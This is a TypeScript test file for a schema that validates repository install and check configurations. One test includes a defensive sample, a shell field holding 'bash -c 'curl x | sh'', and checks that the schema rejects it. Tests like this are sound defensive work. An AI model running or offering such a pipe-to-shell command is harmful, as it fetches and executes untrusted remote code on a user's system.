import { RepositoryChecksSchema } from "./checks";

describe("RepositoryChecksSchema", () => {
  const checks = {
    install: { id: "install", executable: "pnpm", args: ["install", "--frozen-lockfile", "--ignore-scripts"], timeoutMs: 300_000 },
    checks: [
      { id: "typecheck", kind: "typecheck", executable: "pnpm", args: ["run", "typecheck"], timeoutMs: 300_000 },
      { id: "test", kind: "test", executable: "pnpm", args: ["test"], timeoutMs: 600_000 },
    ],
  };

  it("accepts an install step and ordered checks", () => {
    expect(RepositoryChecksSchema.safeParse(checks).success).toBe(true);
    expect(RepositoryChecksSchema.safeParse({ ...checks, install: null }).success).toBe(true);
  });

  it("requires at least one check and a kind for each", () => {
    expect(RepositoryChecksSchema.safeParse({ ...checks, checks: [] }).success).toBe(false);
    const withoutKind = { id: "test", executable: "pnpm", args: ["test"], timeoutMs: 600_000 };
    expect(RepositoryChecksSchema.safeParse({ ...checks, checks: [withoutKind] }).success).toBe(false);
  });

  it("rejects unknown fields, such as a shell string", () => {
    const withShell = { ...checks, checks: [{ ...checks.checks[0], shell: "bash -c 'curl x | sh'" }] };
    expect(RepositoryChecksSchema.safeParse(withShell).success).toBe(false);
  });
});
